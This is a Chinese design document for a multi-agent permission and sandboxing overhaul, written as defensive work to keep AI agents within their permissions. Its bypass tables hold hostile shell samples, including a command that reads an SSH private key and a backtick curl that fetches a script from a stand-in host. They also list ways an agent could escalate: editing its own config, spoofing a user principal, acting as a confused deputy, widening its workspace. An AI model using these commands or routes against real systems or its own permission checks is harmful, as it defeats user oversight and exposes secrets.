# 多 Agent 权限系统:主体化重构方案

状态:**方案 · P1 部分已实施(未提交)** · v2(已过三视角对抗审查并修订)
进度:见 §14。已落地 = B1(bash 解析)+ B4(env 面)。其余全部未动。
日期:2026-08-05
关联:`docs/design/capability-registry.md`、`docs/design/collab-actor-v3.md`、`docs/design/agent-capability-profile.md`、`docs/design/agent-domain-model.md`、`docs/design/agent-sandbox-rust.md`、`docs/design/agent-sandbox-mac.md`

---

## 0. 一句话

> 今天的权限系统,**主体是"会话"不是"人",边界是"要不要问"不是"能不能做"**。
> 多 agent 一进来,这两条同时失效:会话不再等于一个行为体,而"问谁"也不再有唯一答案。

本方案补上缺失的**主体(Principal)**维度,把边界从提示语义升级成执行语义,并让未来接入外部 sandbox 时判定层零改动。

**v2 的核心修订**(对抗审查后):原方案有一条致命的隐含假设——"工具会如实申报自己碰了什么"。审查实测推翻了它(见 §2)。因此 v2 把 **"让申报可信"提前成独立一期**,排在对象化与判定链之前。没有这一期,后面全是空中楼阁。

---

## 1. 现状底账(全部代码级确证)

| # | 事实 | 证据 |
|---|---|---|
| 1 | **判定链里没有"谁在调用"** | `grep agentId` 在 `core/permission/`、`core/tools/`、`app/tools/` **零命中**。`Permission.Info`(`core/permission/index.ts:69-83`)、`PermissionGrant`(`permission-grants.ts:20-38`)、`PermissionEffect`(`core/tools/tool-effect.ts:22-29`)、`EnforcePermissionPolicyInput`(`core/permission/permission-policy.ts:43-55`)四个结构体都无 agent 字段 |
| 2 | **所有 read 无条件放行** | `core/permission/permission-policy.ts:101-104` 把 `kind === 'read'` 直接滤出判定。另有一条**死代码** `:69-72`(`if (effect.kind === 'read') return coversAll(...)`)因第 102 行先滤而永不执行——它会在 read 进判定当天突然复活,必须同期删除 |
| 3 | **`checkCoreFileAccess` 是空壳** | `runtime/src/tools/sandbox.ts:120-134`:`void operation`、`void options.targetType`,只 `path.resolve` 后返回 |
| 4 | **"沙箱"只决定要不要弹窗,不决定能不能访问** | 五个 fs 工具的 `analyze()` 用 `findSandboxRootForPath` 决定加不加 `external_directory` effect;`execute()` 里无任何 root 判定(`write.ts:211,347`、`edit.ts:114`、`read.ts:307,341`、`find.ts:136`) |
| 5 | **16 个工具结构性零审批** | 无 `analyze()` ⇒ effects 为空 ⇒ `permission-policy.ts:147` 直接返回。已注册的 19 个内置工具里**只有 6 个定义了 `analyze`**(read/find/bash/edit/write + variable 走 CoreProvider);`grep`/`glob` 也有 analyze 但**不在桌面注册表**,只在 `apps/server/src/runtime.ts:6234-6239` 的只读注册表里 |

### 1.1 主体缺失的传播路径

agentId 在 **`turn-primitives.ts:49` 的 `collabDriveEnvelope`** 处蒸发,下游全部靠 `store.getSession(sessionId).agentId` **各自反查一次**(`say-tool.ts:88`、`board-tool.ts:33`、`dm-tool.ts:110`、`history-tool.ts:96`、`notebook-tool.ts:52`)。

**反查已被证明不可靠**:`core/session/store-helpers.ts:1303` 给**每一条**新建会话盖 `agentId: defaultAgentId`,所以 `session.agentId` 存在 ≠ 这一轮真有 agent 主体。`history-tool.ts:69-91` 记录了由此产生的真实越权路径,而当时的补救是**再加一道场子门**,不是修身份。

> 这是本方案存在的根本理由:**身份不该被反查,该被铸造并传递。**

### 1.2 三套互不相干的"限制"机制

| 机制 | 位置 | 认什么主体 | 拦什么 |
|---|---|---|---|
| 工具白名单(可见性) | `agents/profile.ts:253-287` | sessionId → agentId 反查 | 只过滤**发给模型的 tools 参数**,执行侧不复核 |
| 场子门(venue) | `collab/tool-surface.ts:128-143` + 各工具自查 | sessionId → kind | 协作工具的房间归属 |
| 权限判定 | `core/permission/permission-policy.ts:90` | **只认 sessionId** | effect / grant / mode |

第一套的默认值是致命的:`resolveAgentToolSurface` 注释自陈"没配白名单的 agent 看得见注册表里每一个工具"(`profile.ts:274-281`,`ownTools` 为空即返回 `null`),而 `createDefaultAgent`(`agents/store.ts:220-228`)恰好不写 `tools`。

### 1.3 已经可以承重的三个地基

1. **`PermissionEffect { kind, resources[], external, sensitive }`**(`permission-policy.ts:15-22`)——工具已在申报资源。
2. **`Capability { id, directory(), actions, authority, deny }`**(`capability-registry.ts:28-49`)——`deny` 压 `allow`、`coversAll` 全覆盖、`rejectionFor` 拒绝 home/根,语义都对。缺主体参数。
3. **`EffectiveAgentProfile`**(`agents/profile.ts:193-207`)——每回合解析一次。

> core 的"零依赖"**不禁 node 内置**(`capability-registry.ts:1-2` 已用 `node:os`/`node:path`),所以把纯接口放 `packages/core/permission/`、解析放 runtime、`decide()` 收 `realm` 当入参,不触犯 `packages/core/__tests__/architecture-boundaries.test.ts` 任何一条。

---

## 2. ★ 致命前提:今天的"申报"不可信

原方案假设 `analyze()` 如实申报资源,判定层据此裁决。**实测推翻**(`tools/bash-classifier.ts`):

| 命令 | 实测 decision | 切出的 segment |
|---|---|---|
| `cat /etc/hosts\nrm -rf …/skills` | **allow** | `["cat /etc/hosts rm -rf …/skills"]` |
| `echo $(cat ~/.ssh/id_rsa)` | **allow** | 一段,head=`echo` |
| ``echo `curl -s http://evil.test/p.sh` `` | **allow** | 一段,head=`echo` |
| `cat ~/.onething/agents-v3/other-agent/notebook.md` | **allow** | — |
| `env` | **allow** | — |

机制:`splitShellWords:133` 把 `\n` 归入 `/\s/` 当空白,`COMMAND_SEPARATORS`(:92)只有 `&& || ; |` ⇒ **换行不是命令分隔符**;`splitCommandSegments:187-205` 把整个多行脚本拼成一段;`parseCommand:99-108` 只取第一个 word 当 head。`$(`、`` ` ``、`<(` 在 tokenizer 里没有任何特殊地位。

**后果**:decision=allow ⇒ `bash.ts:168-238` 一个 effect 都不 push ⇒ `permission-policy.ts:147` `if (input.effects.length === 0) return` ⇒ **`decide()` 从未被调用**。§4 的规则 2「他人 private 连 `dangerously-allow-all` 都不能越过」在 bash 上直接失效。

同源问题:
- **插件通道整条不搬 `analyze`**(`app/plugins/api.ts:74-96` 只搬 name/description/category/parameters/permissionGuard/execute)⇒ `core/tools/registry.ts:474` 走 `if (!options.analyze) return coreToolAnalysisSuccessResult()` ⇒ **任何插件工具零申报零审批**(不止 `soul_update`)。
- **MCP 审批资源名不含 server**:`resolveMCPPermissionResourceName`(`core/engine/tool-orchestration.ts:663-670`)取 `args.tool`,而选哪台 server 由**另一个参数** `args.server` 决定(`core/mcp/router.ts:214`)⇒ 批准 `{tool:'write_file', server:'safe-fs'}` 后改发 `server:'root-fs'` 命中同一 grant,**零提示**。

**结论:P1「申报可信」必须排在对象化与判定链之前。**

---

## 3. 设计原则

1. **主体化** — 每次判定必须能回答"谁在做"。没有主体的调用**默认拒绝**。
2. **身份是凭据不是字符串** — 仓库已有判例:`app/collab/drive-guard.ts:1-22` 逐字写着 *"A string is not a credential. Anything that can put a command on the bus — the server's whole-command forward, a plugin, a mis-scoped internal emitter — can spell 'collab'"*,所以 collab drive 靠 `collabDriveToken` 进程内令牌验真。**principal 必须同级处理。**
3. **零申报即拒绝** — 申报了 `touches` 却给不出具体资源的调用,按 `no-coverage` 走升级策略,**不得早返回**。
4. **一切皆对象** — 主体、资源、动作、授权、判定各自是一等对象,可列举、可序列化、可测试、可在 UI 呈现。
5. **判定与执行分离** — Policy 回答"该不该",Enforcer 负责"让不该的做不到"。
6. **领地推导,不靠配置** — 规则表会漏,漏的那条就是越权。
7. **对 agent 默认拒绝,对用户默认询问**。
8. **透明** — 每个决定带证据链,可列出、可审计、可撤销。
9. **单点** — 判定只有一个函数。今天的另外三条路(MCP `buildMCPPermissionPlan`、external-agents `index.ts:106`、**ACP `app/acp/permission-bridge.ts:50`**)必须并回来。

---

## 4. 对象模型

### 4.1 Principal — 主体

```ts
export type Principal =
  | { kind: 'user'; userId: string; workspaceId?: string }
  | { kind: 'agent'; agentId: string; invokedBy?: Principal }
  | { kind: 'system'; component: string }

export function principalId(p: Principal): string
//  user:<userId> | agent:<agentId> | system:<component>
```

- **`invokedBy`(取代原方案的 `onBehalfOf`)** 记录**是谁挑起了这一轮**。见 §7 混淆代理人。原 `onBehalfOf`("代表用户")在 P0 的铸造点无用户身份可填、且无消费方,**已砍**。
- `kind: 'system'` 是**最小权限主体**,三槽全空,不继承任何用户授权。

**铸造与验真(v2 关键修订)**

原方案把 Principal 铸在 `agent-loop-executor.ts:456`——那一行恰恰**就是方案自己判定不可靠的那次反查**(`resolveAgentProfileForSession(ctx.sessionId)`)。修正:

| | 原方案(错) | v2 |
|---|---|---|
| 铸造点 | `agent-loop-executor.ts:456` | **命令进引擎那一层**(`core/engine/core-stream-engine.ts:627` 附近) |
| 命令上的 `principal` 字段 | 直接信任 | **只在 `isTrustedCollabDrive(cmd)` 为真时接受,否则丢弃并自行铸造** |
| 消费点 | — | `agent-loop-executor` 只读 ctx,不再自己解析 |

不验真的后果(可复现):`POST /api/sessions/<execSessionId>/commands`,body 里塞 `"principal":{"kind":"user","userId":"owner"}` —— `apps/server/src/http.ts:1912` 整个 body 当 command 转发(`runtime.ts:3172-3175` 注释明写"no field is destructured away"),`core-stream-engine.ts:627` 已经在把 `cmd.usageSource` 原样拷进 ctx,同一机制会把 `cmd.principal` 一并拷进去 ⇒ 这一轮以 user 主体运行、吃用户的 grant、规则 10 从 deny 变 ask。

### 4.2 Resource — 资源

```ts
export type ResourceRef = string   // "<scheme>:<opaque>"

export const ResourceScheme = {
  fs: 'fs', proc: 'proc', net: 'net',
  room: 'room', session: 'session', agent: 'agent',
  memory: 'memory', variable: 'var', board: 'board',
  mcp: 'mcp', job: 'job', account: 'account',
} as const
```

**fs 归一化拆成两个函数(v2 修订)**——原方案只有 `normalizeFsResource(input: string)`,但今天 `effect.resources` 里放的**本来就是通配**:

```ts
/** 具体路径:expandTilde → resolve → realpath(存在的最长前缀) → 拒绝残留 '..' */
export async function normalizeFsPath(input: string): Promise<ResourceRef>

/** 通配:realpath 到最长非通配前缀,再拼回 { prefix, recursive } */
export async function normalizeFsPattern(input: string): Promise<ResourcePattern>
```

**落点修正(v2 关键)**:原方案说替换空壳 `checkCoreFileAccess`。实际它只有 4 个调用点(`read.ts:307`、`find.ts:136`、`glob.ts:70`、`grep.ts:173`),而 **`write.ts:105` 与 `edit.ts:114` 走的是 `resolveCoreToolPath`,从不经过它**——按原写法,§8 的招牌 symlink 用例(write 走 symlink 逃逸)**不成立**。

> 正确落点:`runtime/src/tools/sandbox.ts:56 resolveCoreToolPath` —— 所有 fs 工具唯一的共同入口。代价:它是同步的,realpath 化会把 `write.ts:166/211`、`edit.ts:114/206`、`read.ts:218` 一起变 async。

**顺带一条底账**:§4.4 批评 `matchWildcard` 让 `/etc/*` 覆盖全树,但"批准一次写 = 整个目录可写"的**真正来源更早一步**——`write.ts:155-157 filePermissionPattern` 返回 `join(dirname(targetPath), '*')`,effect 自己就把单文件放大成了目录。

动作与旧 `effect.kind` 的映射(旧 kind 保留为 metadata,不再作为判定主键):

```ts
export type Action = 'read' | 'write' | 'delete' | 'execute' | 'connect' | 'send' | 'configure'
```

| 旧 kind | 新 (action, resource) |
|---|---|
| `read` / `sensitive_file_read` | `read` × `fs:`(后者带 `sensitive: true`) |
| `file_write` / `file_edit` / `file_destructive_edit` | `write` × `fs:` |
| `bash` | `execute` × `proc:` + 推导出的 `fs:` / `net:` |
| `mcp` | `write` × `mcp:<server>/<tool>` ← **必须含 server** |
| `external_directory` | 消失——它是判定**结果**不是效果 |
| `capability_change` | `configure` × 被改动的资源 |

### 4.3 Realm — 领地

**六槽(v2 修订:原方案只有四槽,缺 exec/connect 会让 P2 当天每个 agent 的 `ls` 和 `web_search` 全被 deny)**:

```ts
export interface Realm {
  id: string
  private:  ResourcePattern[]   // 只有本主体可读写;他人一律 deny
  workspace:ResourcePattern[]   // 本主体的读写地盘
  readonly: ResourcePattern[]   // 能看不能改
  exec:     ResourcePattern[]   // proc: —— 可执行的命令
  connect:  ResourcePattern[]   // net: —— 可访问的主机
  denied:   ResourcePattern[]   // 压过一切 allow
}

/** v2 修订:原方案 resolve(principal) 拿不到 workingDirectory/roomId */
export interface RealmResolver {
  resolve(principal: Principal, turn: TurnContext): Realm
}
export interface TurnContext {
  sessionId: string
  workingDirectory?: string      // 回合开始时的快照,回合内不可变
  workingDirectoryRoots?: string[]
  roomSessionId?: string
}
```

`ResourcePattern` 是 `{ scheme, prefix, recursive }`——**原方案的 `except`(挖洞)已砍**:规则 10 对 agent 已是默认 deny,"读别人 agent 家目录"本来就不落任何槽;`except` 唯一改变的是用户主体,而用户 `denied` 为空。

**agent 领地推导规则**(`runtime/src/permissions/realm.ts`):

| 槽 | 内容 | 来源 |
|---|---|---|
| `private` | `<store>/agents-v3/<agentId>/**`、`<store>/agents/<agentId>/**`、`memory:<agentId>` | `agent-mailbox.ts:46`、`plugins/soul-memory.ts:2769-2823` |
| `workspace` | `turn.workingDirectory` + `workingDirectoryRoots` + agent 定义的 `realm.workspace` | `store-helpers.ts:753-801` |
| `readonly` | 全局读白名单(三个 note 目录 / `tool-outputs` / Downloads)+ 房间 folder `<store>/rooms/<roomId>/**` + **★ 四个 skill 根** | `sandbox-runtime.ts:111-124`、`room-folder.ts:25`、见下 |
| `exec` | 默认 = `bash-classifier` 的只读白名单(去掉 `env`/`printenv`)+ agent 定义的扩展 | `bash-classifier.ts:22-31` |
| `connect` | 默认 = `net:*`(读为主,先不收);敏感 agent 可收窄 | — |
| `denied` | **★ `<store>/agents.json`、`<store>/settings.json`、`<store>/permissions/**`、`<store>/oauth-tokens.json`**;`~/.ssh/**`、`~/.aws/**` 等密钥目录 | 见 §7 |

**★ skill 四根必须进 `readonly`**(否则 P3 当天所有 agent 读不到任何 skill):skill 正文**不进提示词**,`prompts/builder.ts:313` 明写 *"Use the read tool to load a skill file"* 并输出绝对路径。四个根:user `<store>/skills`(`skills/loader.ts:344`)、builtin `<cwd>/resources/skills` 或 `process.resourcesPath/skills`(`:360-372`)、custom `settings.skills.customDirectories` 任意路径(`:761-780`)、project `.onething/skills` **向上遍历到 home**(`:382-414`)。今天这些读带 `external_directory` ⇒ ask,用户点一次就过;新链下 agent 是**无提示 deny**,而方案并没有给 agent 加授权的产品入口。

**★ `<store>/agents.json` 差一个分隔符就逃出 denied**:`getOnethingAgentsDir()` = `<store>/agents`,`getOnethingAgentsPath()` = `<store>/agents.json`(`storage/paths.ts:68-78`)。`agents.json` **不** startsWith `<store>/agents/`,原方案两条 denied 都不命中。

**用户主体**:`private` 空,`workspace` = Known Projects + 当前 workdir,`readonly` = 全局读白名单,`denied` = 密钥目录,`exec`/`connect` = 不限。
**system 主体**:六槽全空,只能靠显式 Grant。

### 4.4 Grant — 授权(统一 Capability 与 Grant)

```ts
export interface Grant {
  id: string
  subject: string | null            // principalId;null 仅 builtin 可用
  actions: Action[]
  resource: ResourcePattern
  authority: 'builtin' | 'user' | 'user-prompt' | 'agent-definition'
  lifetime:
    | { kind: 'once' } | { kind: 'session'; sessionId: string }
    | { kind: 'room'; roomSessionId: string }        // ★ 新增
    | { kind: 'principal' }                          // ★ 新增:跟着 agent 走
    | { kind: 'workspace'; workspaceRoot: string }
    | { kind: 'forever' }
  expiresAt?: number                // ★ 新增
  deny?: boolean
  createdFrom?: { messageId: string; toolCallId?: string; title: string }
  revokedAt?: number
}
```

- `authority` 的 **`'user'` 与 `'user-prompt'` 是有区别的**:前者是用户在设置页显式创建的(可越过规则 2),后者是聊天里弹窗批的(不可越过)。见 §5。
- 原方案的 `{ kind: 'turn' }` 已砍——没有回合边界 API 可挂。

---

## 5. 判定链

```ts
export async function decide(req: {
  principal: Principal; action: Action; resource: ResourceRef
  realm: Realm; grants: GrantStore; mode: PermissionMode; sensitive?: boolean
}): Promise<Decision>
```

**前置闸(v2 新增,堵 §2 的早返回洞)**:

> 若工具静态申报 `touches` 非空、而本次 `analyze()` 给出零资源,则合成一条 `{ action: 'execute', resource: '<scheme>:*' }` 送进 `decide()`,**不得走 `permission-policy.ts:147` 的早返回**。

| # | 规则 | 结果 | 可否越过 |
|---|---|---|---|
| 1 | 硬禁令(`FORBIDDEN` 命令、系统关键路径) | `deny` | 否 |
| 2 | **闯入他人 private** | `deny` | 仅 `authority:'user'` 的显式 Grant 可开洞;`user-prompt` 与 `dangerously-allow-all` **不可** |
| 3 | 命中 `realm.denied` | `deny` | 同上 |
| 4 | 命中 `deny: true` 的 Grant | `deny` | 否 |
| 5 | 命中 allow Grant(按 `subject` 匹配) | `allow` | — |
| 6 | 落在 `private` / `workspace` 且 action ∈ {read, write} | `allow` | — |
| 7 | 落在 `readonly` 且 action = read | `allow` | — |
| 8 | 落在 `exec` 且 action = execute | `allow` | — |
| 9 | 落在 `connect` 且 action = connect | `allow` | — |
| 10 | `mode === 'dangerously-allow-all'` | `allow` | — |
| 11 | `mode === 'auto-accept-edits'` 且 write × `fs:` | `allow` | — |
| 12 | **无覆盖** → 按主体升级策略 | agent:`deny` / user:`ask` | — |

与现状的三个关键差异:

1. **`dangerously-allow-all` 从第 2 位降到第 10 位**(现状 `permission-policy.ts:97-99` 在 grant/capability 之前短路)。它是用户对**自己**的授权,不能突破他人领地。
2. **read 进入判定**。规则 7 给了很宽的读地盘;越界读对 agent 是 `deny`、对 user 是 `ask`。
3. **规则 12 按主体分叉** —— 用户"超出范围就限定"诉求的落点。agent 定义可把档位调成 `ask`(受托 agent),但**不能调掉规则 2/3**。

```ts
escalation?: 'deny' | 'ask'    // agent 定义新增,默认 'deny'
```

`Decision` 带证据链:

```ts
export interface Decision {
  outcome: 'allow' | 'ask' | 'deny'
  because: { rule: RuleId; grantId?: string; realmSlot?: keyof Realm; resource: ResourceRef; detail?: string }
  guidance?: string     // deny 时给模型的可行动文案
}
```

> `guidance` 不是客套。`unattendedBridge`(`app/tools/core/permission-policy.ts:35-37`)已证明有效:告诉模型"请改用免审批路径,或把结果写进已授权目录",模型会改道。

---

## 6. 工具分类:两轴 + 显式申报

```ts
export interface ToolInfo {
  effectScope: 'turn' | 'session' | 'room' | 'global'
  sharing: 'private' | 'shared'
  touches: readonly ResourceScheme[]
}
```

**v2 修订:不做"缺字段注册失败"**。MCP 工具由外部 server 声明、插件工具由 `app/plugins/api.ts:75-96` 代造,都不可能自带这三个字段;而"与 `planToolPermissionGuardInjection` 同层"这个说法也不成立——那道门今天四档 guard 全部放行(`core/tools/permission-guards.ts:17-28`),挂在一个从不拒绝的钩子旁边不产生约束力。

> 正确做法:**内置工具必填**(加 boundary 规则);MCP / 插件工具给显式保守默认 `{ effectScope:'global', sharing:'shared', touches:['mcp'] }`,由 §5 的前置闸兜住。

### 6.1 全量分类表

| 工具 | effectScope | sharing | touches | 现状审批 | 新判定 |
|---|---|---|---|---|---|
| `time` / `fart` | turn | private | — | 无 | 免判定 |
| `read` | turn | private | fs | read 全放行 | `read × fs:` |
| `find` | turn | private | fs | 沙箱内零审批 | `read × fs:` |
| `web_search` | turn | private | net | **无** | `connect × net:brave` |
| `web_open` | turn | private | net | **无** | `connect × net:<host>` ★ |
| `bash_output` | session | private | job | **无** | `read × job:`(仅自己的)★ |
| `goal` | session | private | session | 无 | `write × session:` |
| `notebook` | global | **private** | fs | **无** | `write × fs:<自己 home>` |
| `write` / `edit` | global | shared | fs | ask | `write × fs:` |
| `bash` | global | shared | proc,fs,net | 分类器(**不可信,见 §2**) | `execute × proc:` + 推导资源 |
| `kill_bash` | global | **shared** | job | **无** | `write × job:`,限本主体 ★ |
| `variable` | 参数决定 | 参数决定 | var,**fs** | 仅目录类 ask | `write × var:` + **workdir 另申报 `configure × fs:`** ★ |
| `board` | **room** | shared | board | **无** | `write × board:<roomId>` |
| `send_message` | **room**(可跨房) | shared | room,agent | **无** | `send × room:` / `send × agent:` ★ |
| `history` | 跨房 | **shared(读他人)** | session | **无** | `read × session:<其他会话>` ★ |
| `radio` | global | shared | account,proc | **无** | `write × account:netease` ★ |
| `practice` | global | shared | fs | **无** | `write × fs:<store>/practice` |
| `soul_get` / `memory_get` | global | shared | memory | **无** | `read × memory:` |
| `soul_update` | global | shared | memory | **无**(规格写 gated,但插件通道不传 analyze) | `write × memory:` ★ |
| `mcp:*` | global | shared | 由 server 定 | 每次 ask,**粒度只到工具名** | `mcp:<server>/<tool>` + 参数进 pattern ★ |

★ = 现状零防护、本方案新增判定。

### 6.2 三处必须收敛的越权面

1. **`kill_bash` 可杀任意后台 job**(`tools/builtin/bash-jobs.ts:119`;注册表是**进程级单例 Map**,`background-jobs.ts:27`;`listBackgroundJobs:183` 无过滤;`stopBackgroundJob:254` 无 owner 参数)→ `job:` 带 owner。
2. **`history` 能读他人与用户的私聊**(`history-tool.ts:69-91` 自陈)→ 场子门降级为第二道。
3. **`send_message` 的跨房 `wake`** → `send × agent:` / `send × room:` 进判定。

---

## 7. ★ 已知绕过与堵法(v2 新增)

对抗审查在"方案全部实施完成"的前提下仍找到以下越权路径。**每一条都必须在对应期堵掉,否则该期的承诺是假的。**

| # | 绕过 | 证据 | 堵在哪一期 |
|---|---|---|---|
| ~~B1~~ ✅ | ~~**bash 换行/`$()`/反引号全部逃逸分类器**~~ | §2 实测表 | **已修**(2026-08-05):换行在 `splitShellWords` 里产出 `;` 分隔;新增 `findOpaqueConstruct`,`$(` / `` ` `` / `<(` / heredoc 降级 ask;回归测试 `__tests__/bash-classifier-bypass.test.ts` |
| B2 | **零申报即免判定**(`permission-policy.ts:147`) | 同上 | **P1** — §5 前置闸 |
| B3 | **agent 改自己的 `agents.json`**(`echo $(python3 -c "…")` 改 `escalation`/`realm`) | `storage/paths.ts:68-78` 差一个分隔符 | **P1**(先靠 denied + B1/B2)+ **P3**(realm.denied 显式含它) |
| ~~B4~~ ⚠️ | **`env` 在只读白名单 + `getShellEnv` 全量继承 `process.env`** ⇒ `.zshrc` 里的 API key 对任意 agent 零审批可见 | `bash-classifier.ts:25`、`bash-executor.ts:106-111` | **半修**(2026-08-05):`env`/`printenv` 已移出只读白名单(直接 dump 现在 ask);`getShellEnv(allowlist)` + `settings.tools.bash.envAllowlist` 机制已落地但**默认 `null` = 仍全量继承**。剩余口:`echo $SOME_KEY` 仍 allow(变量展开的头部是 `echo`,不是不可解析构造),**只有打开白名单才关得掉** |
| B5 | **混淆代理人**:skill-reviewer → `send_message{to:'default', wake:true}` → default agent 用**自己的宽领地**干活 | `dm-tool.ts:93` 只校验成员、`:164` 只拦 wake 到用户 | **P3** — wake/DM 驱动的回合,Principal 带 `invokedBy`,realm 取两方交集 |
| B6 | **agent 自扩领地**:`variable set workdir <任一 Known Project>` 零提示,下一条 write 落进新 workspace | `app/variables/index.ts:75-87` `isPreauthorizedDirectory` 不分主体;`gateways.ts:61-71` `workdirGateway.write` 每次都 `projects.touch()`,列表只增不减 | **P3** — workdir 的 set/append 申报 `configure × fs:<target>/**`;`isPreauthorizedDirectory` 对 agent 主体恒 false;realm.workspace 只认**回合开始时的快照** |
| B7 | **`enforceSetPermission` 的 `!ctx.messageId` 早返回** = 无条件跳过(定时任务/goal 续推/daemon 全中);其 `covered` 判定 `:122-125` 也是纯字符串前缀 | `variables/providers/core.ts:117,165` | **P2** |
| B8 | **MCP grant 跨 server 复用**:批 `{tool:'write_file',server:'safe-fs'}` 后改发 `server:'root-fs'` | `tool-orchestration.ts:663-670` 资源名不含 server | **P1** |
| B9 | **插件工具整条零申报**(不止 `soul_update`) | `app/plugins/api.ts:74-96` 不搬 `analyze` | **P1** |
| B10 | **`EXECUTE_TOOL` IPC 通道不过判定链**(无 analyze 无 enforce);renderer 可达 | `apps/electron/src/main/ipc/tools.ts:75-95` → `tool-execution-context.ts:70-88` | **P0** — 诚实标注:agent 触达不到,**不是提权路径**;但它破坏 §3 单点与 §9 审计完整性 |
| B11 | **ACP 权限桥直连 `Permission.ask`**(第三条绕过 `decide` 的路) | `app/acp/permission-bridge.ts:50` | 单独立项(与 external-agents 一起) |

**已核实**不是绕过口的两条(不必堵):`Permission.respond` 直接 API 虽无 channel 校验(`core/permission/index.ts:404`),但**没有任何工具路径能触达它**,"agent 自批准"不成立;`apps/server` 的只读注册表已被 `validateServerReadOnlyToolAccess` 收敛(`runtime.ts:5423-5440`)。

---

## 8. 用例:skill-review agent 只对特定目录读写

```jsonc
{
  "id": "skill-reviewer",
  "name": "技能审阅",
  "tools": ["read", "find", "edit", "write", "notebook", "send_message"],
  "escalation": "deny",
  "realm": {
    "workspace": ["fs:/Users/yitiansong/data/code/start-electron/skills/**"],
    "readonly":  ["fs:/Users/yitiansong/data/code/start-electron/docs/**"]
  }
}
```

解析出的 Realm(六槽):`private` = 自己的 agents-v3/agents 目录 · `workspace` = `skills/**` + **回合 cwd 快照** · `readonly` = 声明的 docs/ + 全局读白名单 + **四个 skill 根** · `exec` = 只读命令白名单(不含 `env`) · `connect` = `net:*` · `denied` = `agents.json` / `settings.json` / `permissions/**` / 密钥目录 / 他人 private。

| 调用 | 归一化资源 | 命中 | 结果 |
|---|---|---|---|
| `write skills/foo/SKILL.md` | `fs:…/skills/foo/SKILL.md` | 规则 6 · workspace | **allow** |
| `read docs/design/x.md` | `fs:…/docs/design/x.md` | 规则 7 · readonly | **allow** |
| `write docs/design/x.md` | 同上 | 规则 12 · agent + deny | **deny** + guidance |
| `read <store>/agents-v3/other/notebook.md` | — | 规则 2 · 他人 private | **deny**,`dangerously-allow-all` 不放行 |
| `bash cat <store>/agents-v3/other/notebook.md` | `proc:cat` + `fs:…` | **B1/B2 堵住后**才走规则 2 | **deny**(P1 之前:allow) |
| `write skills/escape/passwd`(`escape → /etc` 软链) | `fs:/etc/passwd`(realpath) | 不落任何槽 | **deny**(需 P2 落点在 `resolveCoreToolPath`) |

---

## 9. 透明化

- **权限卡片带主体与依据**:`Permission.Info` 新增 `principal` 与 `decision.because`。从 `Edit file: /Users/…/x.ts` 变成 *"**技能审阅** 想要 **写入** `…/x.ts` · 依据:不在它的工作区(`skills/**`)内 · 此 agent 的越界策略为「询问」"*。
- **agent 履历页新增「权限」面板**:六槽领地 + 所有生效 Grant(来源/生存期/过期)+ 最近 20 条被拒记录,**每条 Grant 可就地撤销**。
- **审计账本** `<store>/permissions/audit/<date>.jsonl`。**v2 修订:不记全部 allow** —— 一次 `find` 递归会产生上千条 fs 判定,"与 token 账本同构"会写爆磁盘。规则:deny/ask 逐条记;allow 按 `(principal, rule, resource 前缀)` 折叠计数,每分钟落一次。
- **设置页「权限总账」**:按主体 × scheme 分组,批量撤销,显示过期时间。(现有 `workspace-grants.json` 实测 149KB,说明用户在用。)

---

## 10. 分期总览

| 期 | 名称 | breaking | 开关 | 依赖 |
|---|---|---|---|---|
| **P0** | 主体贯通 | 否 | — | — |
| **P1** | **★ 申报可信** — **2/5 已落地**(B1 ✅ B4 ⚠️ 半;B2/B8/B9 未动) | 是(bash 行为收紧) | `permissions.enforceDeclaration` | P0 |
| **P2** | 资源对象化 | **是**(realpath 化) | `permissions.enforceFsRealpath` | P1 |
| **P3** | 领地与判定链 | **是** | `permissions.enforceRead`、`permissions.agentEscalation` | P2 |
| **P4** | Grant 统一 | 是(存储格式) | `permissions.grantSchema` | P3 |
| **P5** | 工具两轴申报 + 越权面收敛 | **是** | `permissions.enforceToolScopes` | P1 |
| **P6** | 透明化 | 否 | — | P3,P4 |
| **P7** | Realm → 挂载表(为 sandbox 预留) | 否 | — | P3 |

> **开关统一收在 `settings.permissions.*`。注意 `mergeWithDefaults` 的白名单会静默吞掉未登记的新字段**(既有事故:`storage`/`evals` 曾被吞,`sessionFormat` 开关是死的)——新增开关必须同步登记。

### 各期要点

**P0 — 主体贯通**(唯一零风险的一期)

- **铸造点在命令进引擎那一层**(`core-stream-engine.ts:627` 附近),不在 `agent-loop-executor.ts:456`。
- **命令上的 `principal` 必须验真**:只在 `isTrustedCollabDrive(cmd)` 为真时接受,否则丢弃并自行铸造(§4.1)。
- **交付一张「drive 入口 → 主体」对照表**。原方案只改了 collab 一条,实际非 collab 的 `command:send-message` 发起方有 6 处:

| 入口 | 位置 | 主体 |
|---|---|---|
| gateway | `gateway-runtime.ts:52` —— **直接 `engine.handleSendMessage`,不过 EventBus**,信封加字段传不到,须单独铸造 | `user:<渠道身份>` |
| 电台 DJ | `app/music/radio.ts:342` | `agent:<djAgentId>` |
| goal 续推 | `app/goals/kick.ts:57` | 原会话主体 |
| 语音 | `app/voice/service.ts:368` | `user:<本机用户>` |
| CLI daemon | `app/headless/backend.ts:257/422` | `user:<本机用户>` |
| 定时任务 | `packages/scheduler/…/agent-task-runner.ts:309` | `system:scheduler` |

- **类型改动清单修正**:原方案写的 `core/tools/types.ts:9-13` 是内置工具**收不到**的类型。真正要改的是 `app/tools/types.ts:32` 与 `runtime/src/tools/tool.ts:107`。
- **`EXECUTE_TOOL` IPC 并线**(B10):`apps/electron/src/main/ipc/tools.ts:75-95` 铸 `user` 主体并走同一 `enforcePermissionPolicy`。
- **兜底**:principal 铸不出时落 **`kind:'system'`(六槽全空)**,不是 default agent。原方案的"按 `session.agentId` 反查兜底"会因 `store-helpers.ts:1303` 给每条会话都盖 default agentId 而**复刻 `history-tool.ts:69-91` 记录的那条越权路径**。
- **删除**:原方案的 `equivalenceKey` 加 `principalId` 一项。它声称修的 bug 不存在——pending 是 `Map<sessionId, SessionState>`(`index.ts:117`),`findEquivalentPending` 只在同一会话内查找,而执行会话是 `collabAgentSessionId(agentId, roomSessionId)`,**两个 agent 永远不共享 sessionId**。加了只会把今天合并成一次的提示拆成 N 次串行弹窗。

**P1 — ★ 申报可信**(新增,全案地基)

堵 B1、B2、B4、B8、B9。没有这一期,后面每一期的承诺都可以被一条 `echo $(...)` 绕过。

**P2 — 资源对象化**

- 落点 `resolveCoreToolPath`(不是 `checkCoreFileAccess`),接受 async 传播。
- `normalizeFsPath` / `normalizeFsPattern` 双函数。
- 堵 B7。
